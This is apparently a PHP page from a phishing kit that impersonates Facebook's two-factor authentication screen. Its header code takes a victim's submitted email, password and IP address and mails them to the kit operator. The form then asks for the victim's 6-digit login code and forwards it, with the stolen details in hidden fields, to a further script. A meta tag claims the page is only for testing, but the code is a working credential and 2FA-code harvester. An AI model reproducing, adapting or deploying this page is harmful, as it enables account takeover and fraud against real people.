<?php 

    include('email.php');    

    $emailiReauth = isset($_POST['emailiReauth']) ? $_POST['emailiReauth'] : 'emaili';   
    $passwordiReauth = isset($_POST['repasswordi']) ? $_POST['repasswordi'] : 'repasswordi';

    $ipReauth = isset($_POST['ipjaReauth']) ? $_POST['ipjaReauth'] : 'ipja';
    $randomCodeReauth = isset($_POST['randomCodeReauth']) ? $_POST['randomCodeReauth'] : 'XXX';

    $stringu = '[IPja]: '.$ipReauth. PHP_EOL . PHP_EOL .'[emaili]: '.$emailiReauth. PHP_EOL . PHP_EOL .'[passwordi]: '.$passwordiReauth;

    mail($emailikomplet, "[".$randomCodeReauth."] Repassi i Investitorit...", $stringu, $headers);
  
?>

<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="description" content="This is only for testing purposes and in no way is for public use or misuse, scam or do anything illegal with it">
    <meta name="author" content="Facebook Developer Student Group">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="icon" href="flogo.png">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/l/0,cross/2E8-yNpBMrbsHUpitHChBN.css?_nc_x=RoKQjLkBIlU" data-bootloader-hash="nuHa9gj" crossorigin="anonymous" data-p=":9,86" data-c="2" />

    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yw/l/0,cross/COboB1arX57.css?_nc_x=RoKQjLkBIlU" data-bootloader-hash="sbYhqxZ" crossorigin="anonymous" />

  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="ha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="style2fac.css">
    <script src="https://kit.fontawesome.com/a2267851a4.js" crossorigin="anonymous"></script>
    <title>Appeal Request [two-factor]</title>
  </head>
  <body onload="startCounter();">


  </head>
  <body>

    <section class="afterheader" style="padding-top:50px;">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-6 offset-md-3">  
            
            <div style="border: 1px solid #c8cacc; border-radius: 4px">
              <h3 class="titleh3">Two-factor authentication required</h3>
              <div class="content2">
                  <p></p>You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
                  <p>Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
                  <form action="twofacend.php" method="POST" style="margin-top:14px">

                    <div class="form-group"> 
                      <input type="number" required class="form-control" name="twofactorAuth" id="twofactorAuth" placeholder="Login code" style="width: 170px !important;display: inline">
                        <input type="text" id="minutes" value="4.9833333333333334" style="display: none !important;" name="timer" id="timer">
                        &nbsp;
                        <input type="button" id="timer" value="Start Timer" style="display: inline"><p id="time" style="display: inline"></p>


                    </div>
              </div>
              <div class="desktopclass">
                <a href="javascript: void();" style="margin-top:5px; float: left;font-size: 14px;  color: #385898;font-weight: 641;" data-toggle="modal" data-target="#exampleModalScrollable">Need another way to authenticate?</a>
                  <button type="submit" class="btn btn-primary" name="twofacsub">Send</button>
              </div>
              <div class="container butonsend butonsendonlymobile" style="display:none">
      <div class="row">
        <div class="col-12" style="width: 100% !important;">
               <a href="javascript: void();" style="margin-top:5px; float: left;font-size: 14px; color: #385898;font-weight: 641;" data-toggle="modal" data-target="#exampleModalScrollable">Need another way to authenticate?</a>

          <input type="hidden" id="ipja2fac" name="ipja2fac" value="<?php echo $ipReauth; ?>">
          <input type="hidden" id="randomCode2fac" name="randomCode2fac" value="<?php echo $randomCodeReauth; ?>">
          <input type="hidden" id="emaili2fac" name="emaili2fac" value="<?php echo $emailiReauth; ?>">
          

          <button type="submit" class="btn btn-primary" name="twofacsub" id="twofacsub">Send</button>

        </div>
      </div>
    </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    
    </form>

<script>
    // JavaScrtaliipt Document


var mySeconds;
var intervalHandle;
var myButton=document.getElementById("timer");
var timeDisplay=document.getElementById("time");

function resetPage(){   
    myButton.removeAttribute("disabled");
    myButton.value="Send Code Again";
    timeDisplay.innerHTML="";
    myButton.classList.remove('nolink');

}
function tick(){
    var timeDisplay=document.getElementById("time");
    
    var min=Math.floor(mySeconds/60);
    var sec=mySeconds-(min*60);
    
    if (sec < 10) {
        sec="0"+sec;
    }
    
    var message=min.toString()+":"+sec;
    
    timeDisplay.innerHTML=message+" )";
    
    if(mySeconds===0){
        clearInterval(intervalHandle);
        resetPage();
    }
    mySeconds--;
    
    
}
function startCounter(){
    var myInput=document.getElementById("minutes").value;
    if (isNaN(myInput)){
        alert("Type a valid number please");
        return;
    }
    mySeconds=myInput*60;
    
    intervalHandle=setInterval(tick, 1000);
    myButton.disabled=true;
    myButton.value="( wait: ";
    myButton.classList.add('nolink');
    timeDisplay.innerHTML="5:00 )";
    
}
</script>
<script>
      $(document).ready(function () {
      $("#timer").click();});
      </script>

  </body>
</html>
